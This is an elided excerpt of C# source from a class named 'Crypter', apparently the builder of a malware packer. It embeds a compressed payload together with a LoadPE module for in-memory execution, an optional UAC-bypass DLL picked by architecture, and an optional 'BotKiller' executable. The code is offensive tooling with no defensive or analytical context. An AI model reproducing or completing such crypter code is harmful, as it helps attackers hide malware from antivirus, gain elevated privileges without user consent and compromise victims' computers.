    ...
    public class Crypter
    {
                ...
                List<EmbeddedResource> embeddedResourceList = new List<EmbeddedResource>()
        {
          new EmbeddedResource((UTF8String) "P", Utils.Compress(payload))
                ...
                if (isNative)
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"LP", Utils.Compress(Utils.Resources["LoadPE.dll"])));
                if (options.UACBypass)
                {
                    string key = "UAC.dll";
                    if (ftype == FileType.NET64 || ftype == FileType.x64)
                        key = "UAC64.dll";
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"UAC", Utils.Compress(Utils.Resources[key])));
                }
                if (options.BotKiller)
                    embeddedResourceList.Add(new EmbeddedResource((UTF8String)"BK", Utils.Compress(Utils.Resources["BotKiller.exe"])));
